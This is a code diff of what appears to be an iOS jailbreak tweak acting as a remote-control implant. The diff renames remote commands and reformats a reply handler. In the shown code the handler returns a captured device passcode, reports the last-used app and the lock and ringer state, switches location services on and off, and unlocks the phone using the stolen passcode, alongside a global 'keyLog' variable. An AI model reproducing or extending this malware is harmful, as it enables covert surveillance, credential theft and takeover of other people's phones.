@@ -33,7 +33,7 @@ NSString *keyLog;
     } else if ([command isEqual:@"wake"]) {
 	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
 	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
-    } else if ([command isEqual:@"doublehome"]) {
+    } else if ([command isEqual:@"dhome"]) {
 	if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonDoublePressDown)]) {
 	    [(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonDoublePressDown];
         } else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleMenuDoubleTap)]) {
@@ -50,52 +50,40 @@ NSString *keyLog;
 	    [mediaController setRingerMuted:!mediaController.ringerMuted];
 	}
     } 
-    else if ([command isEqual:@"locationon"]) {
+    else if ([command isEqual:@"locon"]) {
         [%c(CLLocationManager) setLocationServicesEnabled:true];
-    } else if ([command isEqual:@"locationoff"]) {
+    } else if ([command isEqual:@"locoff"]) {
         [%c(CLLocationManager) setLocationServicesEnabled:false];
     }    
 }
 
 %new
 - (NSDictionary *)commandWithReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
-	NSString *command = [userInfo objectForKey:@"cmd"];
-	if ([command isEqual:@"getpasscode"]) {
-		NSString *result = @"";
-		if (passcode != NULL)
-			result = passcode;
-		else 
-			result = @"We have not obtained passcode yet";
-		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"lastapp"]) {
-		SBApplicationIcon *iconcontroller = [(SBIconController *)[%c(SBIconController) sharedInstance] lastTouchedIcon];
-		if (NSString *lastapp = iconcontroller.nodeIdentifier)
-			return [NSDictionary dictionaryWithObject:lastapp forKey:@"returnStatus"];
-		return [NSDictionary dictionaryWithObject:@"none" forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"islocked"]) {
-		if ([(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] isUILocked])  
-			return [NSDictionary dictionaryWithObject:@"true" forKey:@"returnStatus"];
-		return [NSDictionary dictionaryWithObject:@"false" forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"ismuted"]) {
-		NSString *result = @"";
-		if (mediaController.ringerMuted)
-			result = @"muted";
-		else
-			result = @"unmuted";
-		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"unlock"]) {
-		NSString *result = @"";
-		if (passcode != NULL)
-			[(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
-		else 
-			result = @"We have not obtained passcode yet";
-		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
-	}	
-	return [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:1] forKey:@"returnStatus"];
+    NSString *command = [userInfo objectForKey:@"cmd"];
+    if ([command isEqual:@"getpass"]) {
+	NSString *result = @"";
+	if (passcode != NULL) result = passcode;
+	else result = @"We have not obtained passcode yet";
+	return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
+    } else if ([command isEqual:@"lastapp"]) {
+	SBApplicationIcon *iconcontroller = [(SBIconController *)[%c(SBIconController) sharedInstance] lastTouchedIcon];
+	if (NSString *lastapp = iconcontroller.nodeIdentifier) return [NSDictionary dictionaryWithObject:lastapp forKey:@"returnStatus"];
+	return [NSDictionary dictionaryWithObject:@"none" forKey:@"returnStatus"];
+    } else if ([command isEqual:@"islocked"]) {
+	if ([(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] isUILocked]) return [NSDictionary dictionaryWithObject:@"true" forKey:@"returnStatus"];
+	return [NSDictionary dictionaryWithObject:@"false" forKey:@"returnStatus"];
+    } else if ([command isEqual:@"ismuted"]) {
+	NSString *result = @"";
+	if (mediaController.ringerMuted) result = @"muted";
+	else result = @"unmuted";
+	return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
+    } else if ([command isEqual:@"unlock"]) {
+	NSString *result = @"";
+	if (passcode != NULL) [(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
+	else result = @"We have not obtained passcode yet";
+	return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
+    }	
+    return [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:1] forKey:@"returnStatus"];
 }
 %end
 
